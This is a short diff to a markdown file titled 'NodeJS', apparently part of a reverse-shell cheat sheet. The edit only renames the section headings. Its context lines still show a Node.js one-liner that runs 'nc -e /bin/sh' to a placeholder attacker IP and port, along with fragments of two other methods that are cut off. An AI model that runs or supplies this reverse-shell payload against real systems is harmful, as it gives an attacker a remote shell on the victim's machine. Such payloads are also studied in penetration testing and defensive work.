@@ -1,6 +1,6 @@
 # NodeJS
 
-## Method 1
+## 01 - First Method
 
 ```javascript
 (function() {
@@ -17,13 +17,13 @@
 })();
 ```
 
-## Method 2
+## 02 - Second Method
 
 ```javascript
 require('child_process').exec('nc -e /bin/sh <attacker_IP> <LPORT>')
 ```
 
-## Method 3
+## 03 - Third Method
 
 ```javascript
 var x = global.process.mainModule.require
